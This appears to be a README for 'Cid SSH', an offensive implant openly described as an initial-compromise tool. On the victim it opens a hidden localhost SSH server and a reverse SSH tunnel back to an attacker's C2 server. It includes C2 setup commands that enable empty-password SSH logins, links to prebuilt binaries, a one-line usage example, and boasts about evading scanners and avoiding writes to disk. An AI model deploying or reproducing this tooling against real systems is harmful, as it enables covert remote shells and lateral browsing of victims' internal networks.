# Cid SSH
![alt text](http://equestrianstatue.org/wp-content/uploads/2016/04/Spain-Burgos-El-Cid-4-525x394.jpg)

This is a statically compiled tool (no dependencies needed) that can be used to create a SSH server and as SSH client. It will firstly, spin up an SSH server (listening in `localhost` and by default in port 2222), create certificates for it and finally create a reverse SSH tunnel with the C2. Due to the SSH server listens at `localhost`, automated scanners won't be able to detect it. 

Windows systems lack of a proper TTY but thanks to [this](https://blogs.msdn.microsoft.com/commandline/2018/08/02/windows-command-line-introducing-the-windows-pseudo-console-conpty/) we can in recent Windows versions get a fully functional TTY. In the case that the target system does not support `CreatePseudoConsole` it will downgrade to a simple and not interactive shell.

This tool can be used as a fast initial compromise tool that can be used not only as a shell but also to browse the internal network of the victim. 

## Setup instructions
### C2 server
We need to properly configure the SSH server running at the C2 so we don't get hacked.

Run all of these commands:

```
sudo useradd anonymous
echo anonymous:U6aMy0wojraho | sudo chpasswd -e
sudo usermod -s /bin/false anonymous
```

Allow blank passwords for SSH sessions of anonymous in `/etc/ssh/sshd_config`:
```PermitEmptyPasswords yes```

Restart sshd:
```systemctl restart ssh```

### Client
You can just use the prebuilt binaries that are in [Release](https://github.com/illera88/Cid-SSH/releases/tag/v1.0). 

If you want to compile from source keep reading:
Compiling the client is somehow tricky because `libssh` (the library we use to handle SSH communications) does not support creating a SSH server using certificates from memory but they need to exist in disk. Since we are 3l373 hackers we don't want to drop any file to disk so I modified the `libssh` code. 

You can find the modified code [here](https://github.com/illera88/libssh_mod) or getting the prebuilt libraries [here](https://github.com/illera88/PrecompiledLibraries/tree/master/windows/libssh_mod)

To compile it just make sure you add the includes and libraries for:
- libssh_mod 
- zlib
- openssl

You can find all of them already prebuilt for Windows [here](https://github.com/illera88/PrecompiledLibraries/).



## Using it
It's very easy: 

```
Cid-SSH.exe 192.168.15.135
```
